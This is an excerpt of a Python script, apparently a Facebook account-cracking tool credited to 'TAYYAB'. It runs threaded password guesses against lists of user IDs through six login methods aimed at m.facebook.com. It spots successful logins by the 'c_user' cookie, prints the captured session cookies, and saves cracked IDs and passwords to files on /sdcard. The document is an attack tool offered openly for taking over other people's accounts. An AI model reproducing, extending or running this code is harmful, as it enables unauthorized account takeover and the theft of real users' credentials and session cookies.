#created by TAYYAB aka Aryan chaudhary
#open source by TAYYAB
#github= TAYYAB-XD
#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
#JAI NEPAL
# fb id https://www.facebook.com/profile.php?id=61591253291012
...
def uaku2():
        try:
                ...
                a=requests.get('https://github.com/TAYYAB-XD/XD/blob/main/ua2.txt').text
                ua=open('.ua2.txt','w')
...
def TAYYAB1():
        ...
        print("[+]==============================================")
        TAYYABlovesyou = input("[+] [CHOOSE] :- ")
        if TAYYABlovesyou in ['y','Y','1','yes','YES','Yes']:
                TAYYAB_xd.append('y')
        else:
                TAYYAB_xd.append('n')
        print("[+]==============================================")
        ...
        print("[+]==============================================")
        TAYYABtop = input("[+] [CHOOSE] :- ")
        if TAYYABtop in ['y','Y','Yes','YES','1']:
                baby.append('y')
        else:
                baby.append('n')
        with ThreadPool(max_workers=30) as yaari:
                ...
                print(f'[+] METHOD CHOOSED : M{TAYYABfire}')
                ...
                for guru in user:
                        ...
                        if TAYYABfire =='1':yaari.submit(mbasic,uid,pwx,tl)
                        elif TAYYABfire =='2':yaari.submit(p,uid,pwx,tl)
                        elif TAYYABfire =='3':yaari.submit(x,uid,pwx,tl)
                        elif TAYYABfire =='4':yaari.submit(mobile,uid,pwx,tl)
                        elif TAYYABfire =='5':yaari.submit(freeq,uid,pwx,tl)
                        elif TAYYABfire =='6':yaari.submit(d,uid,pwx,tl)
                        else:
        ...
        print('[?] Ids saved in TAYYAB-OK.txt,TAYYAB-CP.txt')
...
def TAYYAB5():
        ...
        with ThreadPool(max_workers=50) as manshera:
                ...
                for love in user:
                        ...
                        for Eman in HamiiID:
                                pwx.append(Eman)
                        if TAYYABfire =='1':manshera.submit(mbasic,uid,pwx,tl)
                        elif TAYYABfire =='2':manshera.submit(p,uid,pwx,tl)
                        elif TAYYABfire =='3':manshera.submit(x,uid,pwx,tl)
                        elif TAYYABfire =='4':manshera.submit(mobile,uid,pwx,tl)
                        elif TAYYABfire =='5':manshera.submit(freeq,uid,pwx,tl)
                        elif TAYYABfire =='6':manshera.submit(d,uid,pwx,tl)
                        else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                cid = coki[151:166]
                                print('\33[1;92m[TAYYAB-OK] '+cid+' | '+ps+'\33[0;97m')
                                if 'y' in TAYYAB_xd:
                                        print("\33[1;92m[💙] \33[1;98mCOOKIES : \33[1;92m"+coki)
                                        cek_apk(session,coki)
                                else:
                                        break
                                open('/sdcard/TAYYAB-OK.txt', 'a').write(cid+' | '+ps+'\n')
                                oks.append(cid)
                                break
                                ...
                                cid = coki[141:156]
                                if 'y' in baby:
                                        print('\33[1;91m[TAYYAB-CP] '+cid+' | '+ps+'\33[0;97m')
                                        open('/sdcard/TAYYAB-CP.txt', 'a').write(cid+' | '+ps+'\n')
                                        cps.append(cid)
                                        break
                                else:
                                        open('/sdcard/TAYYAB-CP.txt', 'a').write(cid+' | '+ps+'\n')
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M1-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M2-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M3-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M4-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M5-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
...
def d(uid,pwx,tl):
    ...
    'cache-control': 'max-age=0',
    'dpr': '2',
    'referer': 'https://m.facebook.com/login/device-based/invalidate-nonce/',
    ...
    'viewport-width': '980',
                        ...
                        if 'c_user' in log_cookies:
                                ...
                                continue
                loop+=1
                sys.stdout.write('\r\33[1;37m[M6-TAYYAB] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
                sys.stdout.flush()
        except:
                pass
